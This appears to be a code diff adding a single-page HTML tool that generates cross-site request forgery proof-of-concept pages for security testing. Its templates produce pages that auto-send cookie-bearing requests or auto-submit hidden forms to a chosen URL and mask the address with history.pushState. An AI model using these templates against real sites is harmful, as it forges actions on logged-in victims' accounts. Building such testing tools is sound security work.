@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #1f2937;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #4b5563;
+            border-radius: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #6b7280;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-200 flex items-center justify-center min-h-screen p-4">
+
+    <div class="w-full max-w-6xl bg-gray-800 rounded-2xl shadow-2xl p-8 space-y-6">
+        <!-- Header -->
+        <div class="text-center">
+            <h1 class="text-3xl font-bold text-white">CSRF PoC Generator</h1>
+            <p class="text-gray-400 mt-2">Create a proof-of-concept HTML page for testing CSRF vulnerabilities.</p>
+        </div>
+
+        <!-- Form Configuration Section -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <!-- Left Column: URL, Method, Enctype -->
+            <div class="space-y-6">
+                <div>
+                    <label for="url" class="block text-sm font-medium text-gray-300 mb-2">Target URL</label>
+                    <input type="url" id="url" placeholder="https://example.com/api/action" class="w-full bg-gray-700 border border-gray-600 text-white rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:outline-none transition">
+                </div>
+                <div>
+                    <label for="method" class="block text-sm font-medium text-gray-300 mb-2">HTTP Method</label>
+                    <select id="method" class="w-full bg-gray-700 border border-gray-600 text-white rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:outline-none transition">
+                        <option value="POST" selected>POST</option>
+                        <option value="PUT">PUT</option>
+                        <option value="GET">GET</option>
+                    </select>
+                </div>
+                <div>
+                    <label for="enctype" class="block text-sm font-medium text-gray-300 mb-2">Encoding Type <span class="text-blue-400 text-xs">(Auto-converts data)</span></label>
+                    <select id="enctype" class="w-full bg-gray-700 border border-gray-600 text-white rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:outline-none transition">
+                        <option value="application/json">application/json (via Fetch)</option>
+                        <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded</option>
+                        <option value="multipart/form-data">multipart/form-data</option>
+                        <option value="text/plain">text/plain</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Middle Column: Parameters -->
+            <div id="params-section" class="space-y-4 hidden">
+                <div class="flex justify-between items-center">
+                    <label class="block text-sm font-medium text-gray-300">Request Parameters</label>
+                    <button id="add-param" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-3 py-1 rounded-md text-sm transition focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800">
+                        + Add
+                    </button>
+                </div>
+                <div id="params-container" class="space-y-3 max-h-48 overflow-y-auto pr-2 custom-scrollbar">
+                    <!-- Parameter fields will be added here -->
+                </div>
+            </div>
+
+            <!-- Right Column: Custom Headers -->
+            <div class="space-y-4">
+                <div class="flex justify-between items-center">
+                    <label class="block text-sm font-medium text-gray-300">Custom Headers</label>
+                    <button id="add-header" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-3 py-1 rounded-md text-sm transition focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-800">
+                        + Add
+                    </button>
+                </div>
+                <div id="headers-container" class="space-y-3 max-h-48 overflow-y-auto pr-2 custom-scrollbar">
+                    <!-- Header fields will be added here -->
+                </div>
+                 <p class="text-xs text-gray-500 pt-2">Note: Browsers block scripts from setting certain <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name" target="_blank" class="text-blue-400 hover:underline">forbidden headers</a> like User-Agent, Origin, etc.</p>
+            </div>
+        </div>
+        
+        <!-- JSON Body Input -->
+        <div id="json-body-container">
+             <label for="json-body" class="block text-sm font-medium text-gray-300 mb-2">JSON Body</label>
+             <textarea id="json-body" rows="5" class="w-full bg-gray-700 border border-gray-600 text-white rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:outline-none transition custom-scrollbar" placeholder='{ "key": "value" }'></textarea>
+        </div>
+
+
+        <!-- Action Button -->
+        <div class="text-center pt-4">
+            <button id="generate-poc" class="w-full md:w-1/2 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg transform hover:scale-105 transition-transform duration-300 ease-in-out">
+                Generate PoC
+            </button>
+        </div>
+
+        <!-- Generated PoC Output -->
+        <div class="space-y-4">
+            <div class="flex justify-between items-center">
+                <h2 class="text-xl font-semibold text-white">Generated PoC Code</h2>
+                <button id="copy-poc" class="bg-gray-600 hover:bg-gray-500 text-white font-semibold px-4 py-2 rounded-md text-sm transition focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-2 focus:ring-offset-gray-800">
+                    Copy
+                </button>
+            </div>
+            <div class="bg-gray-900 rounded-lg p-4 border border-gray-700">
+                <pre><code id="poc-code" class="text-sm text-yellow-300 whitespace-pre-wrap break-all custom-scrollbar"></code></pre>
+            </div>
+            <div id="copy-message" class="text-green-400 text-center text-sm mt-2 opacity-0 transition-opacity duration-300">Copied to clipboard!</div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Element references
+            const urlInput = document.getElementById('url');
+            const methodSelect = document.getElementById('method');
+            const enctypeSelect = document.getElementById('enctype');
+            const paramsContainer = document.getElementById('params-container');
+            const addParamBtn = document.getElementById('add-param');
+            const headersContainer = document.getElementById('headers-container');
+            const addHeaderBtn = document.getElementById('add-header');
+            const generatePocBtn = document.getElementById('generate-poc');
+            const pocCodeEl = document.getElementById('poc-code');
+            const copyPocBtn = document.getElementById('copy-poc');
+            const copyMessage = document.getElementById('copy-message');
+            const jsonBodyContainer = document.getElementById('json-body-container');
+            const jsonBodyInput = document.getElementById('json-body');
+            const paramsSection = document.getElementById('params-section');
+
+            // Generic function to add a key-value input row to a container
+            const addKeyValueRow = (container, keyPlaceholder, valuePlaceholder, removeCallback) => {
+                const div = document.createElement('div');
+                div.classList.add('flex', 'items-center', 'gap-2');
+                div.innerHTML = `
+                    <input type="text" class="key-input w-full bg-gray-600 border border-gray-500 text-white rounded-md px-3 py-1.5 text-sm focus:ring-1 focus:ring-blue-500 focus:outline-none" placeholder="${keyPlaceholder}">
+                    <input type="text" class="value-input w-full bg-gray-600 border border-gray-500 text-white rounded-md px-3 py-1.5 text-sm focus:ring-1 focus:ring-blue-500 focus:outline-none" placeholder="${valuePlaceholder}">
+                    <button class="remove-btn text-red-400 hover:text-red-300 font-bold p-1 rounded-full">&times;</button>
+                `;
+                container.appendChild(div);
+
+                div.querySelector('.remove-btn').addEventListener('click', () => {
+                    div.remove();
+                    if (removeCallback) removeCallback();
+                });
+                return div;
+            };
+
+            // Add parameter and header event listeners
+            addParamBtn.addEventListener('click', () => addKeyValueRow(paramsContainer, 'Key', 'Value'));
+            addHeaderBtn.addEventListener('click', () => addKeyValueRow(headersContainer, 'Header-Name', 'Header-Value'));
+
+            // ** NEW: Event listener for enctype with automatic data conversion **
+            enctypeSelect.addEventListener('change', () => {
+                const isJsonMode = enctypeSelect.value === 'application/json';
+
+                if (isJsonMode) {
+                    // Switching TO JSON mode from form mode
+                    jsonBodyContainer.classList.remove('hidden');
+                    paramsSection.classList.add('hidden');
+
+                    const params = {};
+                    paramsContainer.querySelectorAll('div').forEach(div => {
+                        const key = div.querySelector('.key-input').value.trim();
+                        const value = div.querySelector('.value-input').value.trim();
+                        if (key) {
+                            // Attempt to parse numbers and booleans from form fields
+                            if (!isNaN(value) && value.trim() !== '' && !isNaN(parseFloat(value))) {
+                                params[key] = Number(value);
+                            } else if (value.toLowerCase() === 'true' || value.toLowerCase() === 'false') {
+                                params[key] = (value.toLowerCase() === 'true');
+                            } else {
+                                params[key] = value;
+                            }
+                        }
+                    });
+                    if (Object.keys(params).length > 0) {
+                        jsonBodyInput.value = JSON.stringify(params, null, 2);
+                    }
+
+                } else {
+                    // Switching FROM JSON mode to form mode
+                    jsonBodyContainer.classList.add('hidden');
+                    paramsSection.classList.remove('hidden');
+
+                    try {
+                        const json = JSON.parse(jsonBodyInput.value);
+                        if (typeof json === 'object' && json !== null && !Array.isArray(json)) {
+                            paramsContainer.innerHTML = ''; // Clear existing params
+                            for (const [key, value] of Object.entries(json)) {
+                                const row = addKeyValueRow(paramsContainer, 'Key', 'Value');
+                                row.querySelector('.key-input').value = key;
+                                row.querySelector('.value-input').value = String(value); // Convert all values to string for the input field
+                            }
+                        }
+                    } catch (e) {
+                        console.warn("Could not parse JSON body to auto-fill form parameters.", e);
+                        // If JSON is invalid, do nothing and let the user fill it manually.
+                    }
+                }
+            });
+
+            // Function to generate the PoC code
+            generatePocBtn.addEventListener('click', () => {
+                const url = urlInput.value.trim();
+                const method = methodSelect.value;
+                const enctype = enctypeSelect.value;
+                const jsonBody = jsonBodyInput.value.trim();
+
+                if (!url) {
+                    pocCodeEl.textContent = 'Error: Target URL is required.';
+                    return;
+                }
+                
+                let pocHtml = '';
+
+                // Handle JSON submission via Fetch API
+                if (enctype === 'application/json') {
+                    let sanitizedJsonBody = '{}';
+                    try {
+                        JSON.parse(jsonBody); // Validate JSON
+                        sanitizedJsonBody = jsonBody;
+                    } catch (e) {
+                        pocCodeEl.textContent = 'Error: Invalid JSON in body.';
+                        return;
+                    }
+                    
+                    let headersObject = { 'Content-Type': 'application/json' };
+                    headersContainer.querySelectorAll('div').forEach(div => {
+                        const key = div.querySelector('.key-input').value.trim();
+                        const value = div.querySelector('.value-input').value.trim();
+                        if (key) {
+                            headersObject[key] = value;
+                        }
+                    });
+                    
+                    pocHtml = `<html>
+  <!-- CSRF PoC -->
+  <body>
+  <script>
+    history.pushState('', '', '/')
+    async function submitRequest() {
+      try {
+        // Note: Browsers will block certain headers from being set by scripts.
+        // See: https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name
+        await fetch(${JSON.stringify(url)}, {
+          method: '${method}',
+          headers: ${JSON.stringify(headersObject, null, 2)},
+          body: JSON.stringify(${sanitizedJsonBody}),
+          credentials: 'include' // <<< IMPORTANT: INCLUDE COOKIES
+        });
+        console.log("CSRF request sent successfully.");
+      } catch (error) {
+        console.error("CSRF request failed:", error);
+      }
+    }
+    submitRequest();
+  <\/script>
+  <h1>Request Sent</h1>
+  <p>A cross-site request has been sent to the target. Check the target application to see if the action was performed.</p>
+  </body>
+</html>`;
+                
+                // Handle standard form submissions (Note: forms only support GET/POST)
+                } else {
+                    let formInputs = '';
+                    paramsContainer.querySelectorAll('div').forEach(div => {
+                        const key = div.querySelector('.key-input').value.trim().replace(/"/g, '&quot;');
+                        const value = div.querySelector('.value-input').value.trim().replace(/"/g, '&quot;');
+                        if (key) {
+                            formInputs += `      <input type="hidden" name="${key}" value="${value}" />\n`;
+                        }
+                    });
+
+                    pocHtml = `<html>
+  <!-- CSRF PoC -->
+  <body>
+    <p><b>Note:</b> Standard HTML forms do not support the '${method}' method. This PoC uses a standard form and may not work as expected for methods other than GET or POST.</p>
+    <form action="${url.replace(/"/g, '&quot;')}" method="POST" enctype="${enctype}">
+${formInputs}
+      <!-- Form method overridden to POST for compatibility, as '${method}' is not supported -->
+    </form>
+    <script>
+      // Custom headers cannot be set for standard form submissions.
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    <\/script>
+  </body>
+</html>`;
+                }
+
+                pocCodeEl.textContent = pocHtml;
+            });
+
+            // Function to copy PoC code to clipboard using a fallback method
+            copyPocBtn.addEventListener('click', () => {
+                const pocCode = pocCodeEl.textContent;
+                if (!pocCode) return;
+
+                const textArea = document.createElement("textarea");
+                textArea.value = pocCode;
+                
+                // Make the textarea invisible
+                textArea.style.position = 'fixed';
+                textArea.style.top = 0;
+                textArea.style.left = 0;
+                textArea.style.width = '2em';
+                textArea.style.height = '2em';
+                textArea.style.padding = 0;
+                textArea.style.border = 'none';
+                textArea.style.outline = 'none';
+                textArea.style.boxShadow = 'none';
+                textArea.style.background = 'transparent';
+
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+
+                try {
+                    const successful = document.execCommand('copy');
+                    if (successful) {
+                        copyMessage.classList.remove('opacity-0');
+                        setTimeout(() => {
+                            copyMessage.classList.add('opacity-0');
+                        }, 2000);
+                    } else {
+                         console.error('Fallback: Copying text command was unsuccessful');
+                    }
+                } catch (err) {
+                    console.error('Fallback: Oops, unable to copy', err);
+                }
+
+                document.body.removeChild(textArea);
+            });
+
+            // --- Pre-populate form with new example data ---
+            urlInput.value = 'https://example.com/api/v2/user/profile';
+            
+            const initialJson = {"firstName": "Alex", "lastName": "Roy", "email": "alex.roy@example.com", "newsletter": true};
+            jsonBodyInput.value = JSON.stringify(initialJson, null, 2);
+
+            const initialHeaders = {
+                "X-Client-ID": "mobile-app-v3",
+                "Authorization": "Bearer sample-jwt-token" // Note: This is just a sample
+            };
+            
+            headersContainer.innerHTML = ''; // Clear existing headers
+            for (const [key, value] of Object.entries(initialHeaders)) {
+                const row = addKeyValueRow(headersContainer, 'Header-Name', 'Header-Value');
+                row.querySelector('.key-input').value = key;
+                row.querySelector('.value-input').value = value;
+            }
+            
+            // Clear and repopulate params for the new example
+            paramsContainer.innerHTML = '';
+            for (const [key, value] of Object.entries(initialJson)) {
+                const row = addKeyValueRow(paramsContainer, 'Key', 'Value');
+                row.querySelector('.key-input').value = key;
+                row.querySelector('.value-input').value = String(value);
+            }
+
+            // --- Initial UI State ---
+            enctypeSelect.value = 'application/json';
+            // Manually trigger the change event logic to set the correct initial view
+            const isJsonMode = enctypeSelect.value === 'application/json';
+            if (isJsonMode) {
+                jsonBodyContainer.classList.remove('hidden');
+                paramsSection.classList.add('hidden');
+            } else {
+                jsonBodyContainer.classList.add('hidden');
+                paramsSection.classList.remove('hidden');
+            }
+
+        });
+    </script>
+</body>
+</html>
